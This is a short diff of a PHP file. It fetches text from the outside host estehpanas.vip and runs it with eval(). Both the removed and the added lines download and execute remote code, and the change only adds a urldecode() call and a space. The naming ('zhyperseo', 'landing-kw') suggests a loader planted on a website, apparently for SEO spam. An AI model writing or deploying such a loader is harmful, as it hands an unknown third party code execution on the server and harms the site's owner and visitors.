@@ -1,6 +1,6 @@
 <?php
-$zhyperseo = file_get_contents("https://estehpanas.vip/landing-kw/landing-starvvo.txt");
-$zhyperseo = "?>".$zhyperseo;
+$zhyperseo = file_get_contents(urldecode('https://estehpanas.vip/landing-kw/landing-starvvo.txt'));
+$zhyperseo = "?> ".$zhyperseo;
 eval($zhyperseo);
 ?>
 
